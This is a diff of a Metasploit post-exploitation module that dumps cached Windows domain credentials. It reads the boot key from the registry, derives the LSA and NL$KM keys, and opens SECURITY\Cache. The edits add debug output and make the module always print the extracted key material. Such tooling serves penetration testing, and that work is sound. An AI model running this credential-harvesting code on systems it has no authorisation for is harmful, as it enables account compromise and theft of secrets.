@@ -60,18 +60,21 @@ class Metasploit3 < Msf::Post
 		%W{JD Skew1 GBG Data}.each do |k|
 			ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, basekey + "\\" + k, KEY_READ)
 			return nil if not ok
+			puts ok.inspect
+			puts ok.query_class.to_i(16)
 			bootkey << [ok.query_class.to_i(16)].pack("V")
 			ok.close
 		end
 
 		keybytes = bootkey.unpack("C*")
+		puts keybytes.inspect
 		descrambled = ""
 		descrambler = [ 0x0b, 0x06, 0x07, 0x01, 0x08, 0x0a, 0x0e, 0x00, 0x03, 0x05, 0x02, 0x0f, 0x0d, 0x09, 0x0c, 0x04 ]
 
 		0.upto(keybytes.length-1) do |x|
 			descrambled << [keybytes[descrambler[x]]].pack("C")
 		end
-
+		puts descrambled.inspect
 		return descrambled
 	end
 
@@ -470,15 +473,15 @@ class Metasploit3 < Msf::Post
 
 			print_status('Obtaining boot key...')
 			bootkey = capture_boot_key
-			print_status("Boot key: #{bootkey.unpack("H*")[0]}") if( datastore['DEBUG'] )
+			print_status("Boot key: #{bootkey.unpack("H*")[0]}")
 
 			print_status('Obtaining Lsa key...')
 			lsakey = capture_lsa_key(bootkey)
-			print_status("Lsa Key: #{lsakey.unpack("H*")[0]}") if( datastore['DEBUG'] )
+			print_status("Lsa Key: #{lsakey.unpack("H*")[0]}")
 
 			print_status("Obtaining LK$KM...")
 			nlkm = capture_nlkm(lsakey)
-			print_status("NL$KM: #{nlkm.unpack("H*")[0]}") if( datastore['DEBUG'] )
+			print_status("NL$KM: #{nlkm.unpack("H*")[0]}")
 
 			print_status("Dumping cached credentials...")
 			ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SECURITY\\Cache", KEY_READ)
